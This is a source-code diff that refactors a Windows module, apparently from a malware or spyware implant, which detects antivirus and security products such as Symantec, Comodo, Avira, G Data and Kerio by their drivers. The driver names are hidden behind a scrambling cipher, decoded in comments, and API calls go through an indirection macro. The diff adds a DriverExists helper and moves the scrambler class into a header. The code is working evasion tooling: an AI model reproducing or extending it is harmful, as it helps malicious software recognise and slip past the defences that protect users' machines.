@@ -1,57 +1,4 @@
-struct ScrambleString
-{
-	operator const char* ()
-	{
-		return (string != NULL) ? string : "NIL";
-	}
-
-	operator const wchar_t* ()
-	{
-		return string_w;
-	}
-
-	char* get_str()
-	{
-		return (string != NULL) ? string : "NIL";
-	}
-
-	wchar_t* get_wstr()
-	{
-		return string_w;
-	}
-
-	ScrambleString(const char *ob_str) 
-	{
-		string = LOG_ScrambleName((char *)ob_str, 2, FALSE);
-		if (string)
-			_snwprintf_s(string_w, 64, _TRUNCATE, L"%S", string);		
-		else
-			_snwprintf_s(string_w, 64, _TRUNCATE, L"NIL");		
-	}
-
-	ScrambleString(char *ob_str, BOOL is_demo) 
-	{
-		string = NULL;
-		if (is_demo) {
-			string = LOG_ScrambleName(ob_str, 2, FALSE);
-			if (string)
-				_snwprintf_s(string_w, 64, _TRUNCATE, L"%S", string);		
-			else
-				_snwprintf_s(string_w, 64, _TRUNCATE, L"NIL");		
-		} else
-			_snwprintf_s(string_w, 64, _TRUNCATE, L"");		
-	}
-
-	~ScrambleString(void)
-	{
-		SAFE_FREE(string);
-	}
-
-
-	char *string;
-	WCHAR string_w[64];
-};
-
+#include <scramblestring.h>
 
 BOOL IsDriverRunning(const WCHAR *driver_name)
 {
@@ -82,78 +29,56 @@ BOOL IsDriverRunning(const WCHAR *driver_name)
 	return FALSE;
 }
 
-BOOL IsEndPoint()
+BOOL DriverExists(LPCSTR lpDriverName)
 {
 	WIN32_FIND_DATA fdata;
 	char buffer[DLLNAMELEN];
-	HANDLE hff;
+	ZeroMemory(buffer, sizeof(buffer));
 
+	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
+	strcat(buffer, "\\system32\\drivers\\");
+	strcat(buffer, lpDriverName);
+
+	HANDLE hff = FNC(FindFirstFileA)(buffer, &fdata);
+	if (hff == INVALID_HANDLE_VALUE)
+		return FALSE;
+
+	FNC(FindClose)(hff);
+	return TRUE;
+}
+
+BOOL IsEndPoint()
+{
 	ScrambleString ss1("a71itRPv.1J1"); // "wpsdrvnt.sys"
 	ScrambleString ss2("1tv17.1J1"); // "srtsp.sys"
 
 	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
+	if (!DriverExists(ss1.get_str()))
 		return FALSE;
-	FNC(FindClose)(hff);
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss2.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE) {
-		FNC(FindClose)(hff);
+	if (!DriverExists(ss2.get_str()))
 		return FALSE;
-	}
-
-	FNC(FindClose)(hff);
+	
 	return TRUE;
 }
 
 // XXX - Que - Detection 
 BOOL IsComodo2()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[DLLNAMELEN];
-	HANDLE hff;
-
 	ScrambleString ss1("UP17lgv.1J1"); // "inspect.sys"
 	ScrambleString ss2("goioEP.1J1"); // "cmdmon.sys"
 
 	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
+	if (!DriverExists(ss1.get_str()))
 		return FALSE;
-	FNC(FindClose)(hff);
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss2.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE) {
-		FNC(FindClose)(hff);
+	if (!DriverExists(ss2.get_str()))
 		return FALSE;
-	}
-
-	FNC(FindClose)(hff);
+	
 	return TRUE;
 }
 
@@ -161,46 +86,23 @@ BOOL IsComodo3()
 {
 	// XXX - Que - riabilito la funzione 
 	//return FALSE;
-
-	WIN32_FIND_DATA fdata;
-	char buffer[DLLNAMELEN];
-	HANDLE hff;
-
 	ScrambleString ss1("UP17lgv.1J1"); // "inspect.sys"
 	ScrambleString ss2("goi0W7.1J1"); // "cmdhlp.sys"
 
 	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1);
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
+	if (!DriverExists(ss1.get_str()))
 		return FALSE;
-	FNC(FindClose)(hff);
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss2);
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE) 
+	if (!DriverExists(ss2.get_str()))
 		return FALSE;
-	FNC(FindClose)(hff);
 
 	return TRUE;
 }
 
 BOOL IsAshampoo()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[DLLNAMELEN];
-	HANDLE hff;
-
 	ScrambleString ss1("x10xR4g8P.1J1"); // "AshAvScan.sys"
 	ScrambleString ss2("xPvU47Jj8tlrNd8ti.lVl"); // "AntiSpyWare2Guard.exe"
 	ScrambleString ss3("xPvU47Jj8tlr.lVl"); // "AntiSpyWare2.exe"
@@ -208,14 +110,7 @@ BOOL IsAshampoo()
 	if (IsDriverRunning(ss1))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\");
-	strcat(buffer, ss1);
-	
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff != INVALID_HANDLE_VALUE) {
-		FNC(FindClose)(hff);
+	if (DriverExists(ss1.get_str())) {
 		return TRUE;
 	}
 
@@ -246,84 +141,44 @@ BOOL IsSophos32()
 
 BOOL IsDeepFreeze()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[DLLNAMELEN];
-	HANDLE hff;
-
 	ScrambleString ss1("fll7TtA.1J1"); // "DeepFrz.sys"
 
 	if (IsDriverRunning(ss1.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-	
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
+	if (!DriverExists(ss1.get_str()))
 		return FALSE;
-	FNC(FindClose)(hff);
+
 	return TRUE;
 }
 
 BOOL IsAvira()
 {
-	WIN32_FIND_DATA fdata = {};
-	char buffer[DLLNAMELEN] = {};
-	HANDLE hff = INVALID_HANDLE_VALUE;
-
 	ScrambleString ss1("8RCPvoCt.1J1"); // "avgntmgr.sys"
 	ScrambleString ss2("8RCPvii.1J1"); // "avgntdd.sys"
 
 	if (IsDriverRunning(ss1.get_wstr()) || IsDriverRunning(ss2.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
+	if (!DriverExists(ss1.get_str()))
+		return FALSE;
 
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff != INVALID_HANDLE_VALUE) {
-		FNC(FindClose)(hff);
-		return TRUE;
-	}
+	if (!DriverExists(ss2.get_str()))
+		return FALSE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss2.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff != INVALID_HANDLE_VALUE) {
-		FNC(FindClose)(hff);
-		return TRUE;
-	}
-
-	return FALSE;
+	return TRUE;
 }
 
 BOOL IsPCTools()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[DLLNAMELEN];
-	HANDLE hff;
-
 	ScrambleString ss1("cBKx77LRlPv.1J1"); // "PCTAppEvent.sys"
 
 	if (IsDriverRunning(ss1.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-	
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
+	if (!DriverExists(ss1.get_str()))
 		return FALSE;
-	FNC(FindClose)(hff);
+
 	return TRUE;
 }
 
@@ -755,36 +610,17 @@ BOOL IsKerio()
 	if (IsDriverRunning(ss1.get_wstr()) && IsDriverRunning(ss2.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
+	if (!DriverExists(ss1.get_str()))
 		return FALSE;
-	FNC(FindClose)(hff);
-	
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss2.get_str());
 
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE) 
+	if (!DriverExists(ss2.get_str()))
 		return FALSE;
-	FNC(FindClose)(hff);
 
 	return TRUE;
 }
 
 BOOL CopySystemDriver(WCHAR *drv_path)
 {
-	char sys_path[DLLNAMELEN];
-	char temp_path[DLLNAMELEN];
-	char comp_path[DLLNAMELEN*2];
-	char *drv_scramb_name;
-	PVOID old_value;
 /*	
 	if (!FNC(GetEnvironmentVariableA)("SystemRoot", sys_path, sizeof(sys_path)))
 		return FALSE;
@@ -810,9 +646,6 @@ BOOL CopySystemDriver(WCHAR *drv_path)
 
 BOOL RemoveSystemDriver()
 {
-	char sys_path[DLLNAMELEN];
-	char comp_path[DLLNAMELEN*2];
-	PVOID old_value;
 /*	
 	if (!FNC(GetEnvironmentVariableA)("SystemRoot", sys_path, sizeof(sys_path)))
 		return FALSE;
@@ -835,26 +668,12 @@ BOOL RemoveSystemDriver()
 
 BOOL IsGData()
 {
-	WIN32_FIND_DATA fdata;
-	char buffer[DLLNAMELEN];
-	HANDLE hff;
-	
 	ScrambleString ss1("Nfwl08Rl.1J1"); // GDBehave.sys
 
 	if (IsDriverRunning(ss1.get_wstr()))
 		return TRUE;
 
-	ZeroMemory(buffer, sizeof(buffer));
-	FNC(GetEnvironmentVariableA)("SYSTEMROOT", buffer, sizeof(buffer));
-	strcat(buffer, "\\system32\\drivers\\");
-	strcat(buffer, ss1.get_str());
-	
-	hff = FNC(FindFirstFileA)(buffer, &fdata);
-	if (hff == INVALID_HANDLE_VALUE)
-		return FALSE;
-	FNC(FindClose)(hff);
-
-	return TRUE;
+	return DriverExists(ss1.get_str());
 }
 
 BOOL IsBlackList()
